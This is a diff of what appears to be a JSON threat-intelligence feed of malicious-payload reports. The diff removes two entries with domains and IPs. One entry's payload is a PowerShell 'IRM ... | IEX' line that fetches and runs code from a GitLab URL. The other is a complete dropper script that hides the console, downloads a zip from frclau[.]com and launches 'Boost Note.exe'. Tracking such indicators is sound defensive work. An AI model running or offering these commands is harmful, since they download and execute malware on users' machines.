@@ -7810,39 +7810,5 @@
     ],
     "ReportId": "cmwarjoqg02qf0omloy4jf2gl",
     "ScannedAt": "2026-11-10T14:06:14.491000+00:00"
-  },
-  {
-    "UrlDomain": "viewnet.africa",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "197.242.67.223"
-    ],
-    "Related": [],
-    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
-    ],
-    "ReportId": "cmwar8gmr02l00oml9bak5oxu",
-    "ScannedAt": "2026-11-10T13:57:30.597000+00:00"
-  },
-  {
-    "UrlDomain": "www.dominanceindia.com",
-    "DeliveryUrl": [
-      "frclau.com"
-    ],
-    "PayloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "IP": [
-      "118.139.176.109"
-    ],
-    "Related": [],
-    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "ReportId": "cmwaqy0fn02fg0omlwphh4u0i",
-    "ScannedAt": "2026-11-10T13:49:23.171000+00:00"
   }
 ]
